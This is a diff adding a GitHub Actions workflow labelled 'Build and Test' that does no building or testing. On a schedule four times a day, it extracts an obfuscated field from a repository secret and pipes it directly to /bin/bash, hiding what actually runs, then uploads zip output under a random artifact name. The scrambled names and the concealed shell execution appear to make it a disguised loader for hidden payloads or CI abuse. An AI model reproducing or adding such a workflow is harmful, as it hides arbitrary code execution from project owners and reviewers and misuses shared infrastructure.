@@ -1,0 +1,30 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '31 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          k70: ${{ secrets.k70 }}
+        run: |
+          printf '%s' "$k70" | jq -r .zllwy1 | /bin/bash
+          printf '%s' "$gswuw6" | jq -r .cwblm15373 | /bin/bash
+          echo $nzagp86974 | jq -r .whjp5 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: MeoPOtoo
+          path: "*.zip"
+          retention-days: 1
